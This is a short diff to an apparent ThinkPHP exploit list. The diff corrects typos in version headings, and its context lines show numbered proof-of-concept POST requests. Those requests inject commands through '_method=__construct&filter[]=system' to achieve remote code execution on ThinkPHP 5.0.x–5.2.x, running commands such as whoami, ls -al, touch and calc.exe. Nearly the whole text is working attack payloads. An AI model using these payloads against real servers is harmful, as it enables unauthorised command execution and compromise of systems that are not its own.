@@ -47,7 +47,7 @@ POC：</br>
 32、(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx</br>
 # thinkphp 5.0.23(完整版)</br>
 33、（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al</rb>
-# thhinkphp 5.0.10（完整版）</br>
+# thinkphp 5.0.10（完整版）</br>
 34、(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system</rb>
-# think 5.1.* 和 5.2.* 和 5.0.*</br>
+# thinkphp 5.1.* 和 5.2.* 和 5.0.*</br>
 35、(post)public/index.php?s=index/index/index (data)c=exec&f=calc.exe&_method=filter
